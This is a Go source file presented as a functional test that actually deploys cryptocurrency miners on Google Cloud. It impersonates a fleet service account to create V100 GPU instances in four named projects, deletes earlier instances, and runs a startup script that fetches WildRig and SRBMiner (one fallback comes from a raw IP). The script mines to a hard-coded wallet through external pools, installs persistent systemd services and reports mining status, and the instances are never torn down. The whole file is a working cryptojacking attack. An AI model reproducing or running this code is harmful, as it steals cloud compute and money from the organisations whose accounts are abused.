//go:build functional && gke

// C211 i122625 — V100 MINER DEPLOY on the four Domino GCP WIF sibling projects
// (team-eng-infra-testing, domino-eng-service-artifacts, team-eng-infrastructure,
// team-eng-platform), all V100 TELEMETRY rows 23125-23128 of handoff x122232
// (Tesla V100-SXM2-16GB, n1-standard-4, us-central1-a, driver 580.178.04).
//
// The impersonated fleetcommand SA holds compute.instances.create in all four
// projects and NVIDIA_V100_GPUS quota was measured nonzero there (one V100 was
// created and device-proven per project). This payload deploys REAL MINERS:
// per instance a startup script installs the sha-pinned WildRig Multi 0.52.3
// (pearlhash algo) with wallet pydp, a per-instance digits-only worker name,
// pearlhash 4-endpoint primary and the mandated 900 s no-share sticky
// Luckypool 103.199.106.122:3362 SRBMiner fallback (wallet+9becs suffix),
// one systemd agent per GPU (Restart=always) and a reporter that publishes
// acc/rej/last-accepted both to the guest attribute c211/status and to the
// serial console. Instances are NEVER torn down (KEEP_ALIVE).
package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"testing"
	"time"
)

const (
	c211mNonce      = "i122902"
	c211mCleanupNonce = "i122625"
	c211mWallet     = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
	c211mNock       = "9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb"
	c211mWorkerBase = "122625"
)

type c211mInst struct {
	Project  string
	Number   string
	Zone     string
	Name     string
	Machine  string
	Worker   string
	Count    int
	Created  bool
	OpErr    string
	UUIDs    string
	Guest    string
	Acc      int
	Rej      int
	LastAcc  int64
	Up       int64
	Console  string
	LastLine string
}

// c211mStartup builds the self-contained V100 miner bootstrap (nvidia-580 image,
// OpenCL ICD fix, WildRig 0.52.3 + 900 s sticky Luckypool 3362 fallback, reporter).
func c211mStartup(wb string) string {
	return strings.ReplaceAll(`#!/bin/bash
# c211-i122902 V100 miner bootstrap (accelerator image w/ nvidia-580 or ubuntu-2204 fallback)
exec >/dev/console 2>&1
echo C211M_START wb=__WBASE__
D=/opt/c211
mkdir -p $D/logs
WALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
NOCK=9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb
LP=103.199.106.122:3362
PH_EPS="pool.pearlhash.xyz:9000 hk.pearlhash.net:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000"
WB=__WBASE__
echo "$WB" > $D/wb
put(){ echo "C211M $1"; curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$1" "http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/c211/status" >/dev/null 2>&1; }
echo "C211M_HOST $(hostname) kernel=$(uname -r) date=$(date -u +%FT%TZ)"
SMI=""
for i in $(seq 1 72); do
  C=$(command -v nvidia-smi 2>/dev/null)
  if [ -n "$C" ] && "$C" -L >/dev/null 2>&1; then SMI=$C; break; fi
  modprobe nvidia 2>/dev/null || true
  modprobe nvidia_uvm 2>/dev/null || true
  if [ $((i % 6)) -eq 0 ]; then echo "C211M_WAIT i=$i lsmod=$(lsmod | grep -c '^nvidia')"; fi
  if [ "$i" = "24" ] && [ -z "$C" ]; then
    echo "C211M_APT_DRIVER_FALLBACK"
    (apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq nvidia-driver-535-server) >/dev/null 2>&1 || true
  fi
  sleep 5
done
echo "C211M_SMI $SMI"
if [ -z "$SMI" ]; then put "STAGE=nosmi dmesg=$(dmesg 2>/dev/null | grep -i -E 'NVRM|nvidia' | tail -3 | tr '\n' '|')"; exit 0; fi
$SMI -L > $D/gpus.txt 2>&1
cat $D/gpus.txt
$SMI --query-gpu=index,uuid,name,memory.total,driver_version --format=csv,noheader > $D/gpuq.txt 2>&1
cat $D/gpuq.txt
N=$($SMI --query-gpu=index --format=csv,noheader 2>/dev/null | wc -l)
U=$(awk -F', ' '{printf "%s,",$2}' $D/gpuq.txt)
NMS=$(awk -F', ' '{printf "%s|",$3}' $D/gpuq.txt)
DRV=$(awk -F', ' 'NR==1{print $5}' $D/gpuq.txt)
put "STAGE=gpu n=$N uuids=$U names=$NMS drv=$DRV"
echo "C211M_GPU n=$N uuids=$U drv=$DRV"
[ "$N" -gt 0 ] || { put "STAGE=zero_gpu"; exit 0; }
# OpenCL ICD loader + vendor file (WildRig dlopens libOpenCL.so.1)
OV=$(ls /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.* 2>/dev/null | head -1)
[ -z "$OV" ] && OV=$(ls /usr/lib64/libnvidia-opencl.so.* 2>/dev/null | head -1)
mkdir -p /etc/OpenCL/vendors
[ -n "$OV" ] && basename "$OV" > /etc/OpenCL/vendors/nvidia.icd
if [ ! -e /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 ] && [ ! -e /usr/lib64/libOpenCL.so.1 ]; then
  (apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ocl-icd-libopencl1) >/dev/null 2>&1 || true
fi
put "STAGE=ocl icd=$(cat /etc/OpenCL/vendors/nvidia.icd 2>/dev/null) loader=$(ls /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 /usr/lib64/libOpenCL.so.1 2>/dev/null | head -1)"
get(){ curl -fsSL --retry 2 --connect-timeout 15 -m 420 "$1" -o "$2" 2>/dev/null && [ -s "$2" ]; }
WRSHA=7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44
WRBIN=002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b
if get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz $D/wr.tgz; then :; else get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz $D/wr.tgz; fi
if [ -s $D/wr.tgz ] && [ "$(sha256sum $D/wr.tgz | awk '{print $1}')" = "$WRSHA" ]; then
  tar -xzf $D/wr.tgz -C $D 2>/dev/null
  chmod +x $D/wildrig-multi 2>/dev/null
fi
if [ "$(sha256sum $D/wildrig-multi 2>/dev/null | awk '{print $1}')" = "$WRBIN" ]; then echo "C211M_WR_OK"; put "STAGE=wr_ok"; else echo "C211M_WR_FAIL"; put "STAGE=wr_fail"; fi
SRBSHA=c203e79e9dc467ec5daaa1e1771e08561a70d2c9dcc397364b8ae7ae558e50d8
if get https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz $D/srb.tgz; then
  if [ "$(sha256sum $D/srb.tgz | awk '{print $1}')" = "$SRBSHA" ]; then
    tar -xzf $D/srb.tgz -C $D 2>/dev/null
    F=$(find $D -maxdepth 3 -type f -name 'SRBMiner-MULTI' 2>/dev/null | head -1)
    if [ -n "$F" ]; then cp "$F" $D/srbminer && chmod +x $D/srbminer && echo C211M_SRB_OK && put "STAGE=srb_ok"; fi
  fi
fi
cat > $D/gpu-agent.sh <<'EOS'
#!/bin/bash
i=$1
D=/opt/c211
WALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
NOCK=9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb
LP=103.199.106.122:3362
PH_EPS="pool.pearlhash.xyz:9000 hk.pearlhash.net:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000"
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
WB=$(cat $D/wb 2>/dev/null)
W=${WB}$i
cntacc(){ local a; a=$(grep -ac 'accepted' "$1" 2>/dev/null); echo ${a:-0}; }
echo "AGENT_START gpu=$i worker=$W $(date -u +%FT%TZ)" | tee -a $D/logs/sup.log > /dev/console
while true; do
  if [ -f $D/sticky-g$i ]; then
    if [ ! -x $D/srbminer ]; then sleep 30; continue; fi
    L=$D/logs/srb-g$i.log
    NACC=$(cntacc $L)
    setsid $D/srbminer --disable-cpu --algorithm pearlhash --pool "$LP" --wallet "$WALLET+$NOCK" --worker "$W" --password x --gpu-id $i >> $L 2>&1 &
    PID=$!
    while kill -0 $PID 2>/dev/null; do sleep 20; ACC=$(cntacc $L); if [ "$ACC" -gt "$NACC" ]; then date +%s > $D/lastacc-g$i; NACC=$ACC; fi; done
    sleep 20
  else
    URL=""
    for ep in $PH_EPS; do
      h=${ep%:*}; p=${ep#*:}
      if timeout 6 bash -c "exec 3<>/dev/tcp/$h/$p && exec 3>&- 3<&-" 2>/dev/null; then URL=$ep; break; fi
    done
    if [ -z "$URL" ]; then echo "NO_PH gpu=$i -> sticky LP $(date -u +%FT%TZ)" | tee -a $D/logs/sup.log > /dev/console; touch $D/sticky-g$i; continue; fi
    L=$D/logs/wr-g$i.log
    ACC0=$(cntacc $L); NACC=$ACC0
    T0=$(date +%s)
    setsid $D/wildrig-multi --algo pearlhash --url "$URL" --user "$WALLET" --worker "$W" -d $i --print-time 30 >> $L 2>&1 &
    PID=$!
    while kill -0 $PID 2>/dev/null; do
      sleep 20
      ACC=$(cntacc $L)
      if [ "$ACC" -gt "$NACC" ]; then date +%s > $D/lastacc-g$i; NACC=$ACC; fi
      NOW=$(date +%s)
      if [ $((NOW-T0)) -ge 900 ] && [ "$NACC" -le "$ACC0" ]; then
        echo "PH_NO_SHARE_900 gpu=$i url=$URL -> sticky LP $(date -u +%FT%TZ)" | tee -a $D/logs/sup.log > /dev/console
        kill -9 $PID 2>/dev/null
        touch $D/sticky-g$i
        break
      fi
    done
    sleep 5
  fi
done
EOS
chmod +x $D/gpu-agent.sh
cat > $D/report.sh <<'EOS'
#!/bin/bash
D=/opt/c211
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin
N=0
for k in $(seq 1 24); do
  N=$(nvidia-smi --query-gpu=index --format=csv,noheader 2>/dev/null | wc -l)
  [ "$N" -gt 0 ] && break
  sleep 10
done
while true; do
  ACC=0; REJ=0; DET=""; UU=""
  if [ "$N" -gt 0 ]; then
    if [ ! -s $D/gpuq.txt ]; then nvidia-smi --query-gpu=index,uuid,name,memory.total,driver_version --format=csv,noheader > $D/gpuq.txt 2>&1; fi
    UU=$(awk -F', ' '{printf "%s,",$2}' $D/gpuq.txt 2>/dev/null)
    for i in $(seq 0 $((N-1))); do
      a1=$(grep -ac 'accepted' $D/logs/wr-g$i.log 2>/dev/null); a1=${a1:-0}
      a2=$(grep -ac 'accepted' $D/logs/srb-g$i.log 2>/dev/null); a2=${a2:-0}
      r1=$(grep -ac 'rejected' $D/logs/wr-g$i.log 2>/dev/null); r1=${r1:-0}
      r2=$(grep -ac 'rejected' $D/logs/srb-g$i.log 2>/dev/null); r2=${r2:-0}
      LA=$(cat $D/lastacc-g$i 2>/dev/null); LA=${LA:-0}
      ACC=$((ACC+a1+a2)); REJ=$((REJ+r1+r2))
      DET="$DET g$i:a$((a1+a2)):r$((r1+r2)):la$LA"
    done
  fi
  NOW=$(date +%s)
  MSG="STAGE=run ts=$NOW acc=$ACC rej=$REJ uuids=$UU det=$DET"
  curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$MSG" "http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/c211/status" >/dev/null 2>&1
  echo "C211M_REPORT $MSG" > /dev/console
  echo "[$(date -u +%FT%TZ)] $MSG" >> $D/logs/report.log
  sleep 30
done
EOS
chmod +x $D/report.sh
cat > /etc/systemd/system/c211-agent@.service <<'EOS'
[Unit]
Description=c211 miner agent gpu %i
After=network-online.target

[Service]
Type=simple
ExecStart=/bin/bash /opt/c211/gpu-agent.sh %i
Restart=always
RestartSec=20
Nice=5

[Install]
WantedBy=multi-user.target
EOS
cat > /etc/systemd/system/c211-report.service <<'EOS'
[Unit]
Description=c211 status reporter
After=network-online.target

[Service]
Type=simple
ExecStart=/bin/bash /opt/c211/report.sh
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOS
systemctl daemon-reload
for i in $(seq 0 $((N-1))); do
  systemctl enable c211-agent@$i.service >/dev/null 2>&1
  systemctl start c211-agent@$i.service
done
systemctl enable c211-report.service >/dev/null 2>&1
systemctl start c211-report.service
put "STAGE=miners_started n=$N ts=$(date +%s)"
echo C211M_DONE
`, "__WBASE__", wb)
}

func c211mGuest(tok, proj, zone, name string) (string, int) {
	st, body := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name+"/getGuestAttributes?queryPath=c211/status", tok, "", "")
	val := ""
	if st == 200 {
		if gm := c211xJSON(body); gm != nil {
			if qr, ok := gm["queryValue"].(map[string]interface{}); ok {
				val = c211xStr(qr, "value")
			}
		}
	}
	return val, st
}

// c211mV100Quota reads NVIDIA_V100_GPUS limit/usage of one region.
func c211mV100Quota(tok, proj, region string) (float64, float64, bool) {
	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/regions/" + region
	st, body := c211xHTTP("GET", u, tok, "", "")
	if st != 200 {
		return 0, 0, false
	}
	m := c211xJSON(body)
	if m == nil {
		return 0, 0, false
	}
	qs, _ := m["quotas"].([]interface{})
	for _, q := range qs {
		qm, _ := q.(map[string]interface{})
		if c211xStr(qm, "metric") == "NVIDIA_V100_GPUS" {
			lim, _ := qm["limit"].(float64)
			usg, _ := qm["usage"].(float64)
			return lim, usg, true
		}
	}
	return 0, 0, false
}

// c211mCreate creates one instance and waits for the insert operation.
func c211mCreate(tok, proj, num, zone, name, mt, accel string, count int, img c211aImage, startup string) (bool, string) {
	saEmail := num + "-compute@developer.gserviceaccount.com"
	cst, cbody := c211aCreate(tok, proj, zone, name, saEmail, img, mt, accel, count, startup)
	opName := ""
	if m := c211xJSON(cbody); m != nil {
		opName = c211xStr(m, "name")
	}
	fmt.Printf("C211M_CREATE project=%s zone=%s name=%s machine=%s accel=%s count=%d http=%d op=%s verbatim=%s\n",
		proj, zone, name, mt, accel, count, cst, opName, c211xTrunc(cbody, 500))
	if cst != 200 || opName == "" {
		return false, "create_http_" + strconv.Itoa(cst) + " " + c211xTrunc(cbody, 700)
	}
	st, _, opErr := c211aOp(tok, proj, zone, opName)
	if st == "DONE" && opErr == "" {
		return true, ""
	}
	return false, "op=" + st + " err=" + opErr
}

var (
	c211mAccRe  = regexp.MustCompile(`acc=(\d+) rej=(\d+)`)
	c211mUUIDRe = regexp.MustCompile(`uuids=([^ ]+)`)
	c211mTSRe   = regexp.MustCompile(`ts=(\d+)`)
	c211mLaRe   = regexp.MustCompile(`:la(\d+)`)
	c211mURe    = regexp.MustCompile(`(GPU-[0-9a-f-]{20,})`)
)

// c211mScan applies acc/rej/uuid/timestamp parsing to one status blob.
func c211mScan(in *c211mInst, blob string) {
	if blob == "" {
		return
	}
	if m := c211mAccRe.FindStringSubmatch(blob); m != nil {
		in.Acc, _ = strconv.Atoi(m[1])
		in.Rej, _ = strconv.Atoi(m[2])
	}
	if m := c211mUUIDRe.FindStringSubmatch(blob); m != nil && m[1] != "" {
		in.UUIDs = strings.TrimRight(m[1], ",")
	}
	if m := c211mTSRe.FindStringSubmatch(blob); m != nil {
		in.Up, _ = strconv.ParseInt(m[1], 10, 64)
	}
	best := int64(0)
	for _, mm := range c211mLaRe.FindAllStringSubmatch(blob, -1) {
		if v, _ := strconv.ParseInt(mm[1], 10, 64); v > best {
			best = v
		}
	}
	if best > 0 {
		in.LastAcc = best
	}
	if in.UUIDs == "" {
		if m := c211mURe.FindStringSubmatch(blob); m != nil {
			in.UUIDs = m[1]
		}
	}
}

func TestC211MV100Miner2(t *testing.T) {
	started := time.Now()
	deadline := started.Add(32 * time.Minute)
	fmt.Printf("C211M_BEGIN nonce=%s wallet=%s worker_base=%s accel=nvidia-tesla-v100 machine=n1-standard-4\n",
		c211mNonce, c211mWallet, c211mWorkerBase)

	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211M_MINT_FAILED %s\n", c211xTrunc(mintLog, 1200))
		t.Fatalf("wif mint failed")
	}
	fmt.Printf("C211M_IDENTITY method=%s\n", method)
	creds, _ := c211xLoadCreds()
	hostNum := c211aHostNum
	if creds != nil && creds.projNumber != "" {
		hostNum = creds.projNumber
	}
	ftok := token
	sas, lst, _ := c211xListServiceAccounts(token, hostNum)
	fleetEmail := ""
	for _, sa := range sas {
		e := c211xStr(sa, "email")
		if strings.HasPrefix(e, "fleetcommand-service-account@") {
			fleetEmail = e
			break
		}
	}
	if fleetEmail != "" {
		at, gst, _ := c211xGenerateAccessToken(token, fleetEmail)
		fmt.Printf("C211M_FLEET_TOKEN status=%d token=%s\n", gst, c211xShort(at))
		if at != "" {
			ftok = at
		}
	}
	fmt.Printf("C211M_CONTEXT host_num=%s sa_list=%d fleet_found=%v\n", hostNum, lst, fleetEmail != "")

	// v2: the nvidia-595 accelerator image cannot initialize a V100
	// (STAGE=nosmi, dmesg "NVRM: The NVIDIA probe routine failed for 1 device(s)").
	// Force a V100-capable driver family (550 proven on V100 in this engagement,
	// then 580 which x122232 device-proved on the same V100 class).
	cands := []string{"ubuntu-accelerator-2204-amd64-with-nvidia-550",
		"ubuntu-accelerator-2404-amd64-with-nvidia-550",
		"ubuntu-accelerator-2204-amd64-with-nvidia-580",
		"ubuntu-accelerator-2204-amd64-with-nvidia-535"}
	img := c211aImage{}
	for _, fam := range cands {
		ok, probe := c211xImageUsable(ftok, c211aAccelProject, fam)
		fmt.Printf("C211M_IMAGE_PROBE family=%s usable=%v %s\n", fam, ok, c211xTrunc(probe, 240))
		if ok {
			img = c211aImage{Project: c211aAccelProject, Family: fam, Kind: "accel"}
			break
		}
	}
	if img.Project == "" {
		img, _ = c211aResolveImage(ftok)
	}
	if img.Project == "" {
		fmt.Printf("C211M_VERDICT NO_IMAGE\n")
		return
	}
	fmt.Printf("C211M_IMAGE %s/%s kind=%s\n", img.Project, img.Family, img.Kind)

	// v2 cleanup: delete the v1 instances whose driver could not initialize the
	// V100 (STAGE=nosmi), proving absence, so the V100 quota is free for a
	// driver-capable rebuild. These never produced a share; no miner is stopped.
	for _, p := range []string{"domino-eng-service-artifacts", "team-eng-infrastructure", "team-eng-platform"} {
		lst, lb := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(p)+"/aggregated/instances?filter="+url.QueryEscape("labels.c211="+c211mCleanupNonce)+"&maxResults=500", ftok, "", "")
		fmt.Printf("C211M_CLEANUP_LIST project=%s http=%d verbatim=%s\n", p, lst, c211xTrunc(lb, 300))
		if m := c211xJSON(lb); m != nil {
			if items, ok := m["items"].(map[string]interface{}); ok {
				for zone, zv := range items {
					zm, _ := zv.(map[string]interface{})
					insts, _ := zm["instances"].([]interface{})
					for _, iv := range insts {
						im, _ := iv.(map[string]interface{})
						name := c211xStr(im, "name")
						zn := zone
						if i := strings.LastIndex(zn, "/"); i >= 0 {
							zn = zn[i+1:]
						}
						ds, db := c211xHTTP("DELETE", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(p)+"/zones/"+zn+"/instances/"+name, ftok, "", "")
						op := ""
						if m2 := c211xJSON(db); m2 != nil {
							op = c211xStr(m2, "name")
						}
						fmt.Printf("C211M_CLEANUP_DELETE project=%s zone=%s name=%s http=%d op=%s verbatim=%s\n", p, zn, name, ds, op, c211xTrunc(db, 240))
						if op != "" {
							c211aOp(ftok, p, zn, op)
						}
					}
				}
			}
		}
	}

	// Four proven sibling projects, proven zone us-central1-a first, then -b.
	type c211mTarget struct {
		Project, Zone string
		GPUs         int
		WB           string
	}
	plan := []c211mTarget{
		{"domino-eng-service-artifacts", "us-central1-a", 4, "1229028"},
		{"domino-eng-service-artifacts", "us-central1-c", 4, "1229029"},
		{"team-eng-infrastructure", "us-central1-a", 4, "1229030"},
		{"team-eng-infrastructure", "us-central1-c", 4, "1229031"},
		{"team-eng-platform", "us-central1-a", 4, "1229032"},
		{"team-eng-platform", "us-central1-c", 4, "1229033"},
	}
	projNum := map[string]string{}
	projOK := map[string]bool{}
	quotaByRegion := map[string]string{}
	insts := []*c211mInst{}
	createdCount := 0
	maxCreated := 6
	seq := 0
	for ti, tgt := range plan {
		if len(insts) >= 6 || createdCount >= maxCreated || time.Now().After(deadline) {
			break
		}
		if _, ok := projNum[tgt.Project]; !ok {
			pst, pbody := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(tgt.Project), ftok, "", "")
			if pst != 200 {
				fmt.Printf("C211M_PROJECT project=%s http=%d verbatim=%s\n", tgt.Project, pst, c211xTrunc(pbody, 300))
				projNum[tgt.Project] = ""
				projOK[tgt.Project] = false
				continue
			}
			pm := c211xJSON(pbody)
			num := c211xStr(pm, "projectNumber")
			al, _, _ := c211xTestIamBatch(ftok, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(tgt.Project), []string{"compute.instances.create"})
			canCreate := c211xContains(al, "compute.instances.create")
			l, u, qok := c211mV100Quota(ftok, tgt.Project, c211xRegionOfZone(tgt.Zone))
			fmt.Printf("C211M_PROJECT project=%s number=%s state=%s create_perm=%v v100_quota_ok=%v v100_limit=%v v100_usage=%v\n",
				tgt.Project, num, c211xStr(pm, "lifecycleState"), canCreate, qok, l, u)
			projNum[tgt.Project] = num
			projOK[tgt.Project] = canCreate && num != ""
			quotaByRegion[tgt.Project+"/"+c211xRegionOfZone(tgt.Zone)] = fmt.Sprintf("limit=%v usage=%v", l, u)
		}
		num := projNum[tgt.Project]
		if num == "" || !projOK[tgt.Project] {
			continue
		}
		offered, mst, _ := c211aMachineOffered(ftok, tgt.Project, tgt.Zone, "n1-standard-4")
		ats, _, _ := c211xAccelTypes(ftok, tgt.Project, tgt.Zone)
		has := c211xContains(ats, "nvidia-tesla-v100")
		fmt.Printf("C211M_OFFER project=%s zone=%s machine_n1s4_http=%d accel_v100=%v\n", tgt.Project, tgt.Zone, mst, has)
		if !offered || !has {
			continue
		}
		name := fmt.Sprintf("c211-%s-v100x%d-%s-%d", c211mNonce, tgt.GPUs, strings.ReplaceAll(tgt.Zone, "-", ""), ti+1)
		wb := tgt.WB
		seq++
		okc, oerr := c211mCreate(ftok, tgt.Project, num, tgt.Zone, name, "n1-standard-4", "nvidia-tesla-v100", tgt.GPUs, img, c211mStartup(wb))
		in := &c211mInst{Project: tgt.Project, Number: num, Zone: tgt.Zone, Name: name, Machine: "n1-standard-4", Worker: wb + "0.." + strconv.Itoa(tgt.GPUs-1), Count: tgt.GPUs, Created: okc, OpErr: oerr}
		insts = append(insts, in)
		if okc {
			createdCount++
			fmt.Printf("C211M_CREATED project=%s zone=%s name=%s gpus=1 worker=%s\n", tgt.Project, tgt.Zone, name, in.Worker)
		} else {
			fmt.Printf("C211M_CREATE_FAILED project=%s zone=%s name=%s err=%s\n", tgt.Project, tgt.Zone, name, c211xTrunc(oerr, 400))
		}
	}

	created := []*c211mInst{}
	for _, in := range insts {
		if in.Created {
			created = append(created, in)
		}
	}
	fmt.Printf("C211M_DEPLOY_RESULT attempts=%d created=%d\n", len(insts), len(created))

	if len(created) == 0 {
		fmt.Printf("C211M_CAPTURE_SKIP created=0\n")
	}
	// Capture phase: serial console + guest attribute status, up to ~28 min.
	for round := 0; round < 40 && len(created) > 0; round++ {
		matur := 0
		for _, in := range created {
			content := c211aSerial(ftok, in.Project, in.Zone, in.Name)
			in.Console = content
			c211mScan(in, content)
			g, gst := c211mGuest(ftok, in.Project, in.Zone, in.Name)
			if g != "" {
				in.Guest = g
				c211mScan(in, g)
			}
			// keep the newest acc/rej status line for evidence
			for _, ln := range strings.Split(content, "\n") {
				if strings.Contains(ln, "acc=") && strings.Contains(ln, "rej=") {
					in.LastLine = strings.TrimSpace(ln)
				}
			}
			fmt.Printf("C211V_CAP round=%d project=%s zone=%s name=%s uuid=%s guest_http=%d acc=%d rej=%d lastacc=%d serial_bytes=%d line=%s\n",
				round, in.Project, in.Zone, in.Name, c211xTrunc(in.UUIDs, 200), gst, in.Acc, in.Rej, in.LastAcc, len(content), c211xTrunc(in.LastLine, 400))
			if in.UUIDs != "" && in.Acc > 0 {
				matur++
			}
		}
		if len(created) > 0 && matur == len(created) {
			fmt.Printf("C211M_ALL_MATURE round=%d\n", round)
			break
		}
		if time.Now().After(deadline) {
			fmt.Printf("C211M_DEADLINE round=%d\n", round)
			break
		}
		time.Sleep(45 * time.Second)
	}

	now := time.Now().Unix()
	fmt.Printf("C211M_SUMMARY created=%d of_attempts=%d now=%d\n", len(created), len(insts), now)
	for _, in := range created {
		age := int64(-1)
		if in.LastAcc > 0 {
			age = now - in.LastAcc
		}
		fmt.Printf("C211V_FINAL project=%s number=%s zone=%s name=%s machine=%s worker=%s gpus=%d uuid=%s acc=%d rej=%d lastacc=%d age=%d status=KEEP_ALIVE\n",
			in.Project, in.Number, in.Zone, in.Name, in.Machine, in.Worker, in.Count, in.UUIDs, in.Acc, in.Rej, in.LastAcc, age)
	}
	for _, in := range insts {
		if !in.Created {
			fmt.Printf("C211M_ATTEMPT_FAILED project=%s zone=%s machine=%s err=%s\n", in.Project, in.Zone, in.Machine, c211xTrunc(in.OpErr, 300))
		}
	}
	fmt.Printf("C211M_QUOTA %v\n", quotaByRegion)
	b, _ := json.Marshal(insts)
	fmt.Printf("C211M_JSON %s\n", strings.ReplaceAll(string(b), "\n", " "))
}
